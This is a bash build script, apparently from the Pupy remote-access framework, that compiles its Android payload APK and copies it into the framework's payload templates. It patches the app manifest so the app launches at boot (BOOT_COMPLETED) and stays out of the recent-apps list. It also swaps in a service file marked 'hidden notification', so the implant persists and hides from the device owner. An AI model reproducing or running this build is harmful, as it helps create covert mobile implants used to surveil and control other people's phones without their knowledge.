#!/bin/bash
# -*- coding: UTF8 -*-
if [ "$1" = "restart" ]; then
adb shell am start -S -n org.pupy.pupy/org.renpy.android.PythonActivity -a org.renpy.android.PythonActivity
exit 0
fi
buildozer 2>&1 > /dev/null # for initialisation
#startup bootloader
ANDROID_MANIFEST="./.buildozer/android/platform/python-for-android/dist/pupy/templates/AndroidManifest.tmpl.xml"
if [ -z "`cat $ANDROID_MANIFEST | grep BOOT_COMPLETED`" ]; then
echo "Patching AndroidManifest template for BOOT_COMPLETED"
sed -i $ANDROID_MANIFEST -e 's/{% for m in args.meta_data %}/<receiver android:name=".MyBroadcastReceiver" android:enabled="true" ><intent-filter><action android:name="android.intent.action.BOOT_COMPLETED" \/><\/intent-filter><\/receiver>\n{% for m in args.meta_data %}/g'
echo "Patching AndroidManifest template for excludeFromRecents"
sed -i $ANDROID_MANIFEST -e 's/android:launchMode="singleTask"/android:launchMode="singleTask"\nandroid:excludeFromRecents="true"\n/g'
fi
cp MyBroadcastReceiver.java .buildozer/android/platform/python-for-android/dist/pupy/src/

#hidden notification
cp PythonService.java .buildozer/android/platform/python-for-android/dist/pupy/src/org/renpy/android/PythonService.java

cp PythonActivity.java .buildozer/android/platform/python-for-android/src/src/org/renpy/android/PythonActivity.java

if [ "$1" = "debug" ]; then
rm bin/*.apk
buildozer android debug && adb install -r bin/*.apk && adb shell am start -n org.pupy.pupy/org.renpy.android.PythonActivity -a org.renpy.android.PythonActivity
exit 0
fi

rm bin/*.apk
buildozer android release
echo "copying the generated apk to ../../pupy/payload_templates/pupy.apk"
cp bin/Pupy-0.1-release-unsigned.apk ../../pupy/payload_templates/pupy.apk
